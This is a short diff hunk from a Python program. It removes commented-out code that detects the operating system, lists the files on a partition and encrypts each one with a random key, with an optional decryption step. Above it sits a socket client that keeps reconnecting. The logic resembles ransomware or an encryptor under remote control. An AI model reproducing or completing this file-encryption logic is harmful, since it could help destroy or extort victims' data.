@@ -159,23 +159,3 @@ def client():
         s.close()
         client()
 client()
-
-
-#key = Random.new().read(16)
-#print(key)
-# these two checks for detecting if we are on Win or Linux
-#if platform == "linux" or platform == "linux2":
-    #pathsLi=partition_linux()
-   # print(dir_f_list(pathsLi[1]))
-#elif platform == "win32": 
-    #pathsWi=partition_win()
-    #er=dir_f_list(pathsWi[1])
-    #for f in er:
-       # encryption(key,f)
-
-   # print(er)
-    #o=input("Do you want to reverse?")
-    #if o=="y":
-       ## de=dir_f_list(pathsWi[1])
-        #for f in de:
-           # decryption(key,f)
